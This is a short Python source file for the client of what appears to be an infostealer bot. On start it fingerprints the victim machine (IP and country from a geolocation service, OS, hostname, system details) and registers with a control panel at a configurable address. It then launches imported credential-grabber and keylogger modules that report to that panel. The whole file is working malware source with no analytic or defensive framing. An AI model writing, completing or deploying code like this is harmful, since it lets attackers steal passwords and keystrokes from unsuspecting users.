import platform
import requests
import uuid
from Modules.modules import Cred_Grabber, Key_Grabber
import json

class Agent(object):
    
    PANEL_ADDR = "http://localhost:8080/"
    JSON_PARSER = json.JSONDecoder()
    
    INFOS = JSON_PARSER.decode(requests.get("http://freegeoip.net/json/").text)
    IP = INFOS['ip']
    OS = platform.system()
    USER = platform.node()
    KEY = uuid.uuid1()
    GEO = INFOS['country_code']
    ENUM = platform.uname()
    
    def __init__(self):
        requests.post(self.PANEL_ADDR+"welcome/", data={'key':self.KEY, 'user':self.USER, 'ip':self.IP, 'os':self.OS, 'enum':self.ENUM, 'geo':self.GEO})
        self.cred_grab()
        self.key_grab()
        
    def cred_grab(self):
        cred_grabber = Cred_Grabber(self.KEY, self.PANEL_ADDR)
        
    def key_grab(self):
        keylogger = Key_Grabber(self.KEY, self.PANEL_ADDR)
                
def main():
    core = Agent()
    
if __name__ == "__main__":
    main()
        
    